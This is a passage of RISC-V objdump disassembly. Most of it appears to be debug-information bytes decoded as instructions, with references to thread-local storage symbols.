     39e:	5f0e                	lw	t5,224(sp)
     3a0:	7075                	c.lui	zero,0xffffd
     3a2:	0700                	addi	s0,sp,896
     3a4:	0002f3cf          	fnmadd.s	ft7,ft5,ft0,ft0
     3a8:	6800                	ld	s0,16(s0)
     3aa:	5f0e                	lw	t5,224(sp)
     3ac:	7275                	lui	tp,0xffffd
     3ae:	0700                	addi	s0,sp,896
     3b0:	54d0                	lw	a2,44(s1)
     3b2:	0000                	unimp
     3b4:	7000                	ld	s0,32(s0)
     3b6:	0000f00b          	0xf00b
     3ba:	0700                	addi	s0,sp,896
     3bc:	0005fed3          	fadd.s	ft9,fa1,ft0
     3c0:	7400                	ld	s0,40(s0)
     3c2:	00059f0b          	0x59f0b
     3c6:	0700                	addi	s0,sp,896
     3c8:	0ed4                	addi	a3,sp,852
     3ca:	0006                	c.slli	zero,0x1
     3cc:	7700                	ld	s0,40(a4)
     3ce:	5f0e                	lw	t5,224(sp)
     3d0:	626c                	ld	a1,192(a2)
     3d2:	0700                	addi	s0,sp,896
     3d4:	0002ced7          	0x2ced7
     3d8:	7800                	ld	s0,48(s0)
     3da:	0001a80b          	0x1a80b
     3de:	0700                	addi	s0,sp,896
     3e0:	54da                	lw	s1,180(sp)
     3e2:	0000                	unimp
     3e4:	8800                	0x8800
     3e6:	0001b90b          	0x1b90b
     3ea:	0700                	addi	s0,sp,896
     3ec:	00009fdb          	0x9fdb
     3f0:	9000                	0x9000
     3f2:	0006380b          	0x6380b
     3f6:	0700                	addi	s0,sp,896
     3f8:	41de                	lw	gp,212(sp)
     3fa:	0004                	0x4
     3fc:	9800                	0x9800
     3fe:	0002c90b          	0x2c90b
     402:	0700                	addi	s0,sp,896
     404:	27e2                	fld	fa5,24(sp)
     406:	0001                	nop
     408:	a000                	fsd	fs0,0(s0)
     40a:	00045a0b          	0x45a0b
     40e:	0700                	addi	s0,sp,896
     410:	1ce4                	addi	s1,sp,636
     412:	0001                	nop
     414:	a400                	fsd	fs0,8(s0)
     416:	0002cf0b          	0x2cf0b
     41a:	0700                	addi	s0,sp,896
     41c:	54e5                	li	s1,-7
     41e:	0000                	unimp
     420:	ac00                	fsd	fs0,24(s0)
     422:	1300                	addi	s0,sp,416
     424:	00b5                	addi	ra,ra,13
     426:	0000                	unimp
     428:	0441                	addi	s0,s0,16
     42a:	0000                	unimp
     42c:	4114                	lw	a3,0(a0)
     42e:	0004                	0x4
     430:	1400                	addi	s0,sp,544
     432:	0132                	slli	sp,sp,0xc
     434:	0000                	unimp
     436:	7e14                	ld	a3,56(a2)
     438:	0005                	c.nop	1
     43a:	1400                	addi	s0,sp,544
     43c:	0054                	addi	a3,sp,4
     43e:	0000                	unimp
     440:	0f00                	addi	s0,sp,912
     442:	4c08                	lw	a0,24(s0)
     444:	0004                	0x4
     446:	1500                	addi	s0,sp,672
     448:	0441                	addi	s0,s0,16
     44a:	0000                	unimp
     44c:	b816                	fsd	ft5,48(sp)
     44e:	0004                	0x4
     450:	4800                	lw	s0,16(s0)
     452:	02390707          	0x2390707
     456:	057e                	slli	a0,a0,0x1f
     458:	0000                	unimp
     45a:	00041817          	auipc	a6,0x41
     45e:	0700                	addi	s0,sp,896
     460:	0054023b          	addw	tp,s0,t0
     464:	0000                	unimp
     466:	1700                	addi	s0,sp,928
     468:	0195                	addi	gp,gp,5
     46a:	0000                	unimp
     46c:	65024007          	flq	ft0,1616(tp) # ffffffffffffd650 <_end+0xffffffff7ffe2450>
     470:	0006                	c.slli	zero,0x1
     472:	0800                	addi	s0,sp,16
     474:	00024917          	auipc	s2,0x24
     478:	0700                	addi	s0,sp,896
     47a:	0240                	addi	s0,sp,260
     47c:	0665                	addi	a2,a2,25
     47e:	0000                	unimp
     480:	1710                	addi	a2,sp,928
     482:	0202                	slli	tp,tp,0x0
     484:	0000                	unimp
     486:	65024007          	flq	ft0,1616(tp) # 650 <_tbss_end+0x5cc>
     48a:	0006                	c.slli	zero,0x1
     48c:	1800                	addi	s0,sp,48
     48e:	00047b17          	auipc	s6,0x47
     492:	0700                	addi	s0,sp,896
     494:	0242                	slli	tp,tp,0x10
     496:	0054                	addi	a3,sp,4
     498:	0000                	unimp
     49a:	1720                	addi	s0,sp,936
     49c:	00000027          	0x27
     4a0:	50024307          	flq	ft6,1280(tp) # 500 <_tbss_end+0x47c>
     4a4:	0008                	0x8
     4a6:	2400                	fld	fs0,8(s0)
     4a8:	00049717          	auipc	a4,0x49
     4ac:	0700                	addi	s0,sp,896
     4ae:	0246                	slli	tp,tp,0x11
     4b0:	0054                	addi	a3,sp,4
     4b2:	0000                	unimp
     4b4:	1740                	addi	s0,sp,932
     4b6:	0485                	addi	s1,s1,1
     4b8:	0000                	unimp
     4ba:	65024707          	flq	fa4,1616(tp) # 650 <_tbss_end+0x5cc>
     4be:	0008                	0x8
     4c0:	4800                	lw	s0,16(s0)
     4c2:	00039517          	auipc	a0,0x39
     4c6:	0700                	addi	s0,sp,896
     4c8:	0249                	addi	tp,tp,18
     4ca:	0054                	addi	a3,sp,4
     4cc:	0000                	unimp
     4ce:	1750                	addi	a2,sp,932
     4d0:	048d                	addi	s1,s1,3
     4d2:	0000                	unimp
     4d4:	76024b07          	flq	fs6,1888(tp) # 760 <_tbss_end+0x6dc>
     4d8:	0008                	0x8
     4da:	5800                	lw	s0,48(s0)
     4dc:	0002ae17          	auipc	t3,0x2a
     4e0:	0700                	addi	s0,sp,896
     4e2:	024e                	slli	tp,tp,0x13
     4e4:	0192                	slli	gp,gp,0x4
     4e6:	0000                	unimp
     4e8:	1760                	addi	s0,sp,940
     4ea:	00000227          	0x227
     4ee:	54024f07          	flq	ft10,1344(tp) # 540 <_tbss_end+0x4bc>
     4f2:	0000                	unimp
     4f4:	6800                	ld	s0,16(s0)
     4f6:	0005ef17          	auipc	t5,0x5e
     4fa:	0700                	addi	s0,sp,896
     4fc:	0250                	addi	a2,sp,260
     4fe:	0192                	slli	gp,gp,0x4
     500:	0000                	unimp
     502:	1770                	addi	a2,sp,940
     504:	03d1                	addi	t2,t2,20
     506:	0000                	unimp
     508:	7c025107          	0x7c025107
     50c:	0008                	0x8
     50e:	7800                	ld	s0,48(s0)
     510:	00025117          	auipc	sp,0x25
     514:	0700                	addi	s0,sp,896
     516:	0254                	addi	a3,sp,260
     518:	0054                	addi	a3,sp,4
     51a:	0000                	unimp
     51c:	1780                	addi	s0,sp,992
     51e:	01b1                	addi	gp,gp,12
     520:	0000                	unimp
     522:	7e025507          	0x7e025507
     526:	0005                	c.nop	1
     528:	8800                	0x8800
     52a:	00041117          	auipc	sp,0x41
     52e:	0700                	addi	s0,sp,896
     530:	0278                	addi	a4,sp,268
     532:	082d                	addi	a6,a6,11
     534:	0000                	unimp
     536:	1890                	addi	a2,sp,112
     538:	00000383          	lb	t2,0(zero) # ffffffffffffd000 <_end+0xffffffff7ffe1e00>
     53c:	b1027c07          	0xb1027c07
     540:	0002                	c.slli	zero,0x0
     542:	f800                	sd	s0,48(s0)
     544:	1801                	addi	a6,a6,-32
     546:	0281                	addi	t0,t0,0
     548:	0000                	unimp
     54a:	72027d07          	0x72027d07
     54e:	0002                	c.slli	zero,0x0
     550:	0000                	unimp
     552:	1802                	slli	a6,a6,0x20
     554:	0595                	addi	a1,a1,5
     556:	0000                	unimp
     558:	8d028107          	0x8d028107
     55c:	0008                	0x8
     55e:	1800                	addi	s0,sp,48
     560:	1805                	addi	a6,a6,-31
     562:	00000137          	lui	sp,0x0
     566:	2a028607          	0x2a028607
     56a:	0006                	c.slli	zero,0x1
     56c:	2000                	fld	fs0,0(s0)
     56e:	1805                	addi	a6,a6,-31
     570:	0112                	slli	sp,sp,0x4
     572:	0000                	unimp
     574:	99028707          	0x99028707
     578:	0008                	0x8
     57a:	3800                	fld	fs0,48(s0)
     57c:	0005                	c.nop	1
     57e:	0584080f          	0x584080f
     582:	0000                	unimp
     584:	0102                	slli	sp,sp,0x0
     586:	0308                	addi	a0,sp,384
     588:	0004                	0x4
     58a:	1500                	addi	s0,sp,672
     58c:	0584                	addi	s1,sp,704
     58e:	0000                	unimp
     590:	0423080f          	0x423080f
     594:	0000                	unimp
     596:	0000b513          	sltiu	a0,ra,0
     59a:	b400                	fsd	fs0,40(s0)
     59c:	0005                	c.nop	1
     59e:	1400                	addi	s0,sp,544
     5a0:	0441                	addi	s0,s0,16
     5a2:	0000                	unimp
     5a4:	3214                	fld	fa3,32(a2)
     5a6:	0001                	nop
     5a8:	1400                	addi	s0,sp,544
     5aa:	05b4                	addi	a3,sp,712
     5ac:	0000                	unimp
     5ae:	5414                	lw	a3,40(s0)
     5b0:	0000                	unimp
     5b2:	0000                	unimp
     5b4:	058b080f          	0x58b080f
     5b8:	0000                	unimp
     5ba:	0596080f          	0x596080f
     5be:	0000                	unimp
     5c0:	0000aa13          	slti	s4,ra,0
     5c4:	de00                	sw	s0,56(a2)
     5c6:	0005                	c.nop	1
     5c8:	1400                	addi	s0,sp,544
     5ca:	0441                	addi	s0,s0,16
     5cc:	0000                	unimp
     5ce:	3214                	fld	fa3,32(a2)
     5d0:	0001                	nop
     5d2:	1400                	addi	s0,sp,544
     5d4:	00aa                	slli	ra,ra,0xa
     5d6:	0000                	unimp
     5d8:	5414                	lw	a3,40(s0)
     5da:	0000                	unimp
     5dc:	0000                	unimp
     5de:	05c0080f          	0x5c0080f
     5e2:	0000                	unimp
     5e4:	00005413          	srli	s0,zero,0x0
     5e8:	f800                	sd	s0,48(s0)
     5ea:	0005                	c.nop	1
     5ec:	1400                	addi	s0,sp,544
     5ee:	0441                	addi	s0,s0,16
     5f0:	0000                	unimp
     5f2:	3214                	fld	fa3,32(a2)
     5f4:	0001                	nop
     5f6:	0000                	unimp
     5f8:	05e4080f          	0x5e4080f
     5fc:	0000                	unimp
     5fe:	3f08                	fld	fa0,56(a4)
     600:	0000                	unimp
     602:	0e00                	addi	s0,sp,784
     604:	0006                	c.slli	zero,0x1
     606:	0900                	addi	s0,sp,144
     608:	007f                	0x7f
     60a:	0000                	unimp
     60c:	0002                	c.slli	zero,0x0
     60e:	3f08                	fld	fa0,56(a4)
     610:	0000                	unimp
     612:	1e00                	addi	s0,sp,816
     614:	0006                	c.slli	zero,0x1
     616:	0900                	addi	s0,sp,144
     618:	007f                	0x7f
     61a:	0000                	unimp
     61c:	0000                	unimp
     61e:	4005                	c.li	zero,1
     620:	0004                	0x4
     622:	0700                	addi	s0,sp,896
     624:	011f 02f9 0000      	0x2f9011f
     62a:	7c19                	lui	s8,0xfffe6
     62c:	0005                	c.nop	1
     62e:	1800                	addi	s0,sp,48
     630:	5f012307          	flw	ft6,1520(sp) # 5f0 <_tbss_end+0x56c>
     634:	0006                	c.slli	zero,0x1
     636:	1700                	addi	s0,sp,928
     638:	0468                	addi	a0,sp,524
     63a:	0000                	unimp
     63c:	5f012507          	flw	fa0,1520(sp)
     640:	0006                	c.slli	zero,0x1
     642:	0000                	unimp
     644:	00026717          	auipc	a4,0x26
     648:	0700                	addi	s0,sp,896
     64a:	0126                	slli	sp,sp,0x9
     64c:	0054                	addi	a3,sp,4
     64e:	0000                	unimp
     650:	1708                	addi	a0,sp,928
     652:	043a                	slli	s0,s0,0xe
     654:	0000                	unimp
     656:	65012707          	flw	fa4,1616(sp)
     65a:	0006                	c.slli	zero,0x1
     65c:	1000                	addi	s0,sp,32
     65e:	0f00                	addi	s0,sp,912
     660:	2a08                	fld	fa0,16(a2)
     662:	0006                	c.slli	zero,0x1
     664:	0f00                	addi	s0,sp,912
     666:	1e08                	addi	a0,sp,816
     668:	0006                	c.slli	zero,0x1
     66a:	1900                	addi	s0,sp,176
     66c:	001f 0000 070e      	0x70e0000001f
     672:	06a0013f bf170000 	0xbf17000006a0013f
     67a:	0004                	0x4
     67c:	0700                	addi	s0,sp,896
     67e:	0140                	addi	s0,sp,132
     680:	06a0                	addi	s0,sp,840
     682:	0000                	unimp
     684:	1700                	addi	s0,sp,928
     686:	00000507          	0x507
     68a:	a0014107          	flq	ft2,-1536(sp)
     68e:	0006                	c.slli	zero,0x1
     690:	0600                	addi	s0,sp,768
     692:	00052817          	auipc	a6,0x52
     696:	0700                	addi	s0,sp,896
     698:	0142                	slli	sp,sp,0x10
     69a:	004d                	c.nop	19
     69c:	0000                	unimp
     69e:	000c                	0xc
     6a0:	4d08                	lw	a0,24(a0)
     6a2:	0000                	unimp
     6a4:	b000                	fsd	fs0,32(s0)
     6a6:	0006                	c.slli	zero,0x1
     6a8:	0900                	addi	s0,sp,144
     6aa:	007f                	0x7f
     6ac:	0000                	unimp
     6ae:	0002                	c.slli	zero,0x0
     6b0:	d81a                	sw	t1,48(sp)
     6b2:	b1025907          	0xb1025907
     6b6:	17000007          	0x17000007
     6ba:	0560                	addi	s0,sp,652
     6bc:	0000                	unimp
     6be:	5b025b07          	0x5b025b07
     6c2:	0000                	unimp
     6c4:	0000                	unimp
     6c6:	00050d17          	auipc	s10,0x50
     6ca:	0700                	addi	s0,sp,896
     6cc:	025c                	addi	a5,sp,260
     6ce:	057e                	slli	a0,a0,0x1f
     6d0:	0000                	unimp
     6d2:	1708                	addi	a0,sp,928
     6d4:	02a1                	addi	t0,t0,8
     6d6:	0000                	unimp
     6d8:	b1025d07          	0xb1025d07
     6dc:	10000007          	0x10000007
     6e0:	0005b817          	auipc	a6,0x5b
     6e4:	0700                	addi	s0,sp,896
     6e6:	025e                	slli	tp,tp,0x17
     6e8:	01a8                	addi	a0,sp,200
     6ea:	0000                	unimp
     6ec:	172c                	addi	a1,sp,936
     6ee:	0212                	slli	tp,tp,0x4
     6f0:	0000                	unimp
     6f2:	54025f07          	0x54025f07
     6f6:	0000                	unimp
     6f8:	5000                	lw	s0,32(s0)
     6fa:	00046317          	auipc	t1,0x46
     6fe:	0700                	addi	s0,sp,896
     700:	0260                	addi	s0,sp,268
     702:	07c1                	addi	a5,a5,16
     704:	0000                	unimp
     706:	1758                	addi	a4,sp,932
     708:	05ce                	slli	a1,a1,0x13
     70a:	0000                	unimp
     70c:	6b026107          	0x6b026107
     710:	0006                	c.slli	zero,0x1
     712:	6000                	ld	s0,0(s0)
     714:	00046e17          	auipc	t3,0x46
     718:	0700                	addi	s0,sp,896
     71a:	0262                	slli	tp,tp,0x18
     71c:	011c                	addi	a5,sp,128
     71e:	0000                	unimp
     720:	1770                	addi	a2,sp,940
     722:	05d9                	addi	a1,a1,22
     724:	0000                	unimp
     726:	1c026307          	0x1c026307
     72a:	0001                	nop
     72c:	7800                	ld	s0,48(s0)
     72e:	0000c117          	auipc	sp,0xc
     732:	0700                	addi	s0,sp,896
     734:	0264                	addi	s1,sp,268
     736:	011c                	addi	a5,sp,128
     738:	0000                	unimp
     73a:	1780                	addi	s0,sp,992
     73c:	0000058b          	0x58b
     740:	c8026507          	0xc8026507
     744:	88000007          	0x88000007
     748:	00029517          	auipc	a0,0x29
     74c:	0700                	addi	s0,sp,896
     74e:	0266                	slli	tp,tp,0x19
     750:	07d8                	addi	a4,sp,964
     752:	0000                	unimp
     754:	1790                	addi	a2,sp,992
     756:	0535                	addi	a0,a0,13
     758:	0000                	unimp
     75a:	54026707          	0x54026707
     75e:	0000                	unimp
     760:	a800                	fsd	fs0,16(s0)
     762:	0001d217          	auipc	tp,0x1d
     766:	0700                	addi	s0,sp,896
     768:	0268                	addi	a0,sp,268
     76a:	011c                	addi	a5,sp,128
     76c:	0000                	unimp
     76e:	17ac                	addi	a1,sp,1000
     770:	00aa                	slli	ra,ra,0xa
     772:	0000                	unimp
     774:	1c026907          	0x1c026907
     778:	0001                	nop
     77a:	b400                	fsd	fs0,40(s0)
     77c:	0001c117          	auipc	sp,0x1c
     780:	0700                	addi	s0,sp,896
     782:	026a                	slli	tp,tp,0x1a
     784:	011c                	addi	a5,sp,128
     786:	0000                	unimp
     788:	17bc                	addi	a5,sp,1000
     78a:	0050                	addi	a2,sp,4
     78c:	0000                	unimp
     78e:	1c026b07          	0x1c026b07
     792:	0001                	nop
     794:	c400                	sw	s0,8(s0)
     796:	00005f17          	auipc	t5,0x5
     79a:	0700                	addi	s0,sp,896
     79c:	026c                	addi	a1,sp,268
     79e:	011c                	addi	a5,sp,128
     7a0:	0000                	unimp
     7a2:	17cc                	addi	a1,sp,996
     7a4:	0416                	slli	s0,s0,0x5
     7a6:	0000                	unimp
     7a8:	54026d07          	0x54026d07
     7ac:	0000                	unimp
     7ae:	d400                	sw	s0,40(s0)
     7b0:	0800                	addi	s0,sp,16
     7b2:	0584                	addi	s1,sp,704
     7b4:	0000                	unimp
     7b6:	07c1                	addi	a5,a5,16
     7b8:	0000                	unimp
     7ba:	7f09                	lui	t5,0xfffe2
     7bc:	0000                	unimp
     7be:	1900                	addi	s0,sp,176
     7c0:	0200                	addi	s0,sp,256
     7c2:	0708                	addi	a0,sp,896
     7c4:	0070                	addi	a2,sp,12
     7c6:	0000                	unimp
     7c8:	8408                	0x8408
     7ca:	0005                	c.nop	1
     7cc:	d800                	sw	s0,48(s0)
     7ce:	09000007          	0x9000007
     7d2:	007f                	0x7f
     7d4:	0000                	unimp
     7d6:	84080007          	0x84080007
     7da:	0005                	c.nop	1
     7dc:	e800                	sd	s0,16(s0)
     7de:	09000007          	0x9000007
     7e2:	007f                	0x7f
     7e4:	0000                	unimp
     7e6:	681b0017          	auipc	zero,0x681b0
     7ea:	0701                	addi	a4,a4,0
     7ec:	0272                	slli	tp,tp,0x1c
     7ee:	080d                	addi	a6,a6,3
     7f0:	0000                	unimp
     7f2:	00037317          	auipc	t1,0x37
     7f6:	0700                	addi	s0,sp,896
     7f8:	0275                	addi	tp,tp,29
     7fa:	080d                	addi	a6,a6,3
     7fc:	0000                	unimp
     7fe:	1700                	addi	s0,sp,928
     800:	0354                	addi	a3,sp,388
     802:	0000                	unimp
     804:	1d027607          	0x1d027607
     808:	0008                	0x8
     80a:	f000                	sd	s0,32(s0)
     80c:	0800                	addi	s0,sp,16
     80e:	000002f3          	0x2f3
     812:	081d                	addi	a6,a6,7
     814:	0000                	unimp
     816:	7f09                	lui	t5,0xfffe2
     818:	0000                	unimp
     81a:	1d00                	addi	s0,sp,688
     81c:	0800                	addi	s0,sp,16
     81e:	0000005b          	0x5b
     822:	082d                	addi	a6,a6,11
     824:	0000                	unimp
     826:	7f09                	lui	t5,0xfffe2
     828:	0000                	unimp
     82a:	1d00                	addi	s0,sp,688
     82c:	1c00                	addi	s0,sp,560
     82e:	0168                	addi	a0,sp,140
     830:	50025707          	0x50025707
     834:	0008                	0x8
     836:	1d00                	addi	s0,sp,688
     838:	04b8                	addi	a4,sp,584
     83a:	0000                	unimp
     83c:	b0026e07          	0xb0026e07
     840:	0006                	c.slli	zero,0x1
     842:	1d00                	addi	s0,sp,688
     844:	05a5                	addi	a1,a1,9
     846:	0000                	unimp
     848:	e8027707          	0xe8027707
     84c:	00000007          	0x7
     850:	8408                	0x8408
     852:	0005                	c.nop	1
     854:	6000                	ld	s0,0(s0)
     856:	0008                	0x8
     858:	0900                	addi	s0,sp,144
     85a:	007f                	0x7f
     85c:	0000                	unimp
     85e:	0018                	0x18
     860:	9f1e                	add	t5,t5,t2
     862:	0000                	unimp
     864:	0f00                	addi	s0,sp,912
     866:	6008                	ld	a0,0(s0)
     868:	0008                	0x8
     86a:	1f00                	addi	s0,sp,944
     86c:	0876                	slli	a6,a6,0x1d
     86e:	0000                	unimp
     870:	4114                	lw	a3,0(a0)
     872:	0004                	0x4
     874:	0000                	unimp
     876:	086b080f          	0x86b080f
     87a:	0000                	unimp
     87c:	0192080f          	0x192080f
     880:	0000                	unimp
     882:	8d1f 0008 1400      	0x140000088d1f
     888:	0054                	addi	a3,sp,4
     88a:	0000                	unimp
     88c:	0f00                	addi	s0,sp,912
     88e:	9308                	0x9308
     890:	0008                	0x8
     892:	0f00                	addi	s0,sp,912
     894:	8208                	0x8208
     896:	0008                	0x8
     898:	0800                	addi	s0,sp,16
     89a:	061e                	slli	a2,a2,0x7
     89c:	0000                	unimp
     89e:	08a9                	addi	a7,a7,10
     8a0:	0000                	unimp
     8a2:	7f09                	lui	t5,0xfffe2
     8a4:	0000                	unimp
     8a6:	0200                	addi	s0,sp,256
     8a8:	2000                	fld	fs0,0(s0)
     8aa:	0549                	addi	a0,a0,18
     8ac:	0000                	unimp
     8ae:	4102fe07          	0x4102fe07
     8b2:	0004                	0x4
     8b4:	2000                	fld	fs0,0(s0)
     8b6:	0542                	slli	a0,a0,0x10
     8b8:	0000                	unimp
     8ba:	4702ff07          	0x4702ff07
     8be:	0004                	0x4
     8c0:	0300                	addi	s0,sp,384
     8c2:	0034                	addi	a3,sp,8
     8c4:	0000                	unimp
     8c6:	1808                	addi	a0,sp,48
     8c8:	0034                	addi	a3,sp,8
     8ca:	0000                	unimp
     8cc:	00009703          	lh	a4,0(ra)
     8d0:	0800                	addi	s0,sp,16
     8d2:	6238                	ld	a4,64(a2)
     8d4:	0000                	unimp
     8d6:	0300                	addi	s0,sp,384
     8d8:	000003b7          	lui	t2,0x0
     8dc:	3c08                	fld	fa0,56(s0)
     8de:	0074                	addi	a3,sp,12
     8e0:	0000                	unimp
     8e2:	8b21                	andi	a4,a4,8
     8e4:	09000003          	lb	zero,144(zero) # 681b0876 <_tbss_end+0x681b07f2>
     8e8:	00057e63          	bleu	zero,a0,904 <_tbss_end+0x880>
     8ec:	0800                	addi	s0,sp,16
     8ee:	08c1                	addi	a7,a7,16
     8f0:	0000                	unimp
     8f2:	0900                	addi	s0,sp,144
     8f4:	0000                	unimp
     8f6:	7f22                	ld	t5,40(sp)
     8f8:	0000                	unimp
     8fa:	ff00                	sd	s0,56(a4)
     8fc:	0000013f 00040823 	0x408230000013f
     904:	0100                	addi	s0,sp,128
     906:	ed39                	bnez	a0,964 <_tbss_end+0x8e0>
     908:	0008                	0x8
     90a:	0900                	addi	s0,sp,144
     90c:	00294003          	lbu	zero,2(s2) # 24476 <_tbss_end+0x243f2>
     910:	0080                	addi	s0,sp,64
     912:	0000                	unimp
     914:	2300                	fld	fs0,0(a4)
     916:	05f4                	addi	a3,sp,716
     918:	0000                	unimp
     91a:	0e02                	slli	t3,t3,0x0
     91c:	000008d7          	0x8d7
     920:	0309                	addi	t1,t1,2
     922:	2920                	fld	fs0,80(a0)
     924:	8000                	0x8000
     926:	0000                	unimp
     928:	0000                	unimp
     92a:	c108                	sw	a0,0(a0)
     92c:	0008                	0x8
     92e:	3a00                	fld	fs0,48(a2)
     930:	0009                	c.nop	2
     932:	0900                	addi	s0,sp,144
     934:	007f                	0x7f
     936:	0000                	unimp
     938:	1723003f 02000000 	0x20000001723003f
     940:	00092a0f          	0x92a0f
     944:	0900                	addi	s0,sp,144
     946:	01694003          	lbu	zero,22(s2)
     94a:	0080                	addi	s0,sp,64
     94c:	0000                	unimp
     94e:	0800                	addi	s0,sp,16
     950:	08c1                	addi	a7,a7,16
     952:	0000                	unimp
     954:	095f 0000 7f09      	0x7f090000095f
     95a:	0000                	unimp
     95c:	9f00                	0x9f00
     95e:	2300                	fld	fs0,0(a4)
     960:	000003a7          	0x3a7
     964:	1002                	c.slli	zero,0x20
     966:	0000094f          	fnmadd.s	fs2,ft0,ft0,ft0,rne
     96a:	0309                	addi	t1,t1,2
     96c:	2880                	fld	fs0,16(s1)
     96e:	8000                	0x8000
     970:	0000                	unimp
     972:	0000                	unimp
     974:	00034c23          	0x34c23
     978:	0200                	addi	s0,sp,256
     97a:	2a11                	addiw	s4,s4,4
     97c:	0009                	c.nop	2
     97e:	0900                	addi	s0,sp,144
     980:	01698003          	lb	zero,22(s3)
     984:	0080                	addi	s0,sp,64
     986:	0000                	unimp
     988:	0800                	addi	s0,sp,16
     98a:	08c1                	addi	a7,a7,16
     98c:	0000                	unimp
     98e:	099a                	slli	s3,s3,0x6
     990:	0000                	unimp
     992:	7f24                	ld	s1,120(a4)
     994:	0000                	unimp
     996:	ff00                	sd	s0,56(a4)
     998:	ae23003f 02000003 	0x2000003ae23003f
     9a0:	8912                	mv	s2,tp
     9a2:	0009                	c.nop	2
     9a4:	0900                	addi	s0,sp,144
     9a6:	0169c003          	lbu	zero,22(s3)
     9aa:	0080                	addi	s0,sp,64
     9ac:	0000                	unimp
     9ae:	2500                	fld	fs0,8(a0)
     9b0:	0059454b          	fnmsub.s	fa0,fs2,ft5,ft0,rmm
     9b4:	1302                	slli	t1,t1,0x20
     9b6:	0584                	addi	s1,sp,704
     9b8:	0000                	unimp
     9ba:	0309                	addi	t1,t1,2
     9bc:	2928                	fld	fa0,80(a0)
     9be:	8000                	0x8000
     9c0:	0000                	unimp
     9c2:	0000                	unimp
     9c4:	00001023          	sh	zero,0(zero) # 0 <_tdata_begin>
     9c8:	0200                	addi	s0,sp,256
     9ca:	5414                	lw	a3,40(s0)
     9cc:	0000                	unimp
     9ce:	0900                	addi	s0,sp,144
     9d0:	00292c03          	lw	s8,2(s2)
     9d4:	0080                	addi	s0,sp,64
     9d6:	0000                	unimp
     9d8:	2600                	fld	fs0,8(a2)
     9da:	05fe                	slli	a1,a1,0x1f
     9dc:	0000                	unimp
     9de:	5f02                	lw	t5,32(sp)
     9e0:	0054                	addi	a3,sp,4
     9e2:	0000                	unimp
     9e4:	12c2                	slli	t0,t0,0x30
     9e6:	8000                	0x8000
     9e8:	0000                	unimp
     9ea:	0000                	unimp
     9ec:	01e6                	slli	gp,gp,0x19
     9ee:	0000                	unimp
     9f0:	0000                	unimp
     9f2:	0000                	unimp
     9f4:	9c01                	subw	s0,s0,s0
     9f6:	0b70                	addi	a2,sp,412
     9f8:	0000                	unimp
     9fa:	00012527          	fsw	ft0,10(sp) # 1c786 <_tbss_end+0x1c702>
     9fe:	0200                	addi	s0,sp,256
     a00:	d760                	sw	s0,108(a4)
     a02:	0008                	0x8
     a04:	0200                	addi	s0,sp,256
     a06:	4891                	li	a7,4
     a08:	0005d327          	0x5d327
     a0c:	0200                	addi	s0,sp,256
     a0e:	d761                	beqz	a4,9d6 <_tbss_end+0x952>
     a10:	0008                	0x8
     a12:	0300                	addi	s0,sp,384
     a14:	b091                	j	258 <_tbss_end+0x1d4>
     a16:	277f                	0x277f
     a18:	051a                	slli	a0,a0,0x6
     a1a:	0000                	unimp
     a1c:	6102                	ld	sp,0(sp)
     a1e:	000008d7          	0x8d7
     a22:	7fa09103          	lh	sp,2042(ra)
     a26:	00004627          	fsq	ft0,12(zero) # c <_tdata_begin+0xc>
     a2a:	0200                	addi	s0,sp,256
     a2c:	d761                	beqz	a4,9f4 <_tbss_end+0x970>
     a2e:	0008                	0x8
     a30:	0300                	addi	s0,sp,384
     a32:	8891                	andi	s1,s1,4
     a34:	277f                	0x277f
     a36:	00b9                	addi	ra,ra,14
     a38:	0000                	unimp
     a3a:	6102                	ld	sp,0(sp)
     a3c:	000008d7          	0x8d7
     a40:	7f989103          	lh	sp,2041(a7)
     a44:	00000c27          	0xc27
     a48:	0200                	addi	s0,sp,256
     a4a:	d761                	beqz	a4,a12 <_tbss_end+0x98e>
     a4c:	0008                	0x8
     a4e:	0300                	addi	s0,sp,384
     a50:	9091                	srli	s1,s1,0x24
     a52:	277f                	0x277f
     a54:	000003c7          	fmsub.s	ft7,ft0,ft0,ft0,rne
     a58:	6102                	ld	sp,0(sp)
     a5a:	000008d7          	0x8d7
     a5e:	7f809103          	lh	sp,2040(ra)
     a62:	0000fc27          	0xfc27
     a66:	0200                	addi	s0,sp,256
     a68:	c162                	sw	s8,128(sp)
     a6a:	0008                	0x8
     a6c:	0200                	addi	s0,sp,256
     a6e:	6f91                	lui	t6,0x4
     a70:	0005e727          	0x5e727
     a74:	0200                	addi	s0,sp,256
     a76:	000b7063          	bleu	zero,s6,a76 <_tbss_end+0x9f2>
     a7a:	0900                	addi	s0,sp,144
     a7c:	01a9c003          	lbu	zero,26(s3)
     a80:	0080                	addi	s0,sp,64
     a82:	0000                	unimp
     a84:	2800                	fld	fs0,16(s0)
     a86:	12d6                	slli	t0,t0,0x35
     a88:	8000                	0x8000
     a8a:	0000                	unimp
     a8c:	0000                	unimp
     a8e:	01c6                	slli	gp,gp,0x11
     a90:	0000                	unimp
     a92:	0000                	unimp
     a94:	0000                	unimp
     a96:	6c29                	lui	s8,0xa
     a98:	6e65                	lui	t3,0x19
     a9a:	0200                	addi	s0,sp,256
     a9c:	5466                	lw	s0,120(sp)
     a9e:	0000                	unimp
     aa0:	0200                	addi	s0,sp,256
     aa2:	6891                	lui	a7,0x4
     aa4:	de28                	sw	a0,120(a2)
     aa6:	0012                	c.slli	zero,0x4
     aa8:	0080                	addi	s0,sp,64
     aaa:	0000                	unimp
     aac:	aa00                	fsd	fs0,16(a2)
     aae:	0001                	nop
     ab0:	0000                	unimp
     ab2:	0000                	unimp
     ab4:	2700                	fld	fs0,8(a4)
     ab6:	03c0                	addi	s0,sp,452
     ab8:	0000                	unimp
     aba:	8b02                	jr	s6
     abc:	000008d7          	0x8d7
     ac0:	9102                	jalr	sp
     ac2:	2a40                	fld	fs0,144(a2)
     ac4:	12de                	slli	t0,t0,0x37
     ac6:	8000                	0x8000
     ac8:	0000                	unimp
     aca:	0000                	unimp
     acc:	0030                	addi	a2,sp,8
     ace:	0000                	unimp
     ad0:	0000                	unimp
     ad2:	0000                	unimp
     ad4:	00000ae7          	jalr	s5,zero
     ad8:	0004f627          	0x4f627
     adc:	0200                	addi	s0,sp,256
     ade:	d769                	beqz	a4,aa8 <_tbss_end+0xa24>
     ae0:	0008                	0x8
     ae2:	0200                	addi	s0,sp,256
     ae4:	6091                	lui	ra,0x4
     ae6:	2a00                	fld	fs0,16(a2)
     ae8:	1338                	addi	a4,sp,424
     aea:	8000                	0x8000
     aec:	0000                	unimp
     aee:	0000                	unimp
     af0:	00ee                	slli	ra,ra,0x1b
     af2:	0000                	unimp
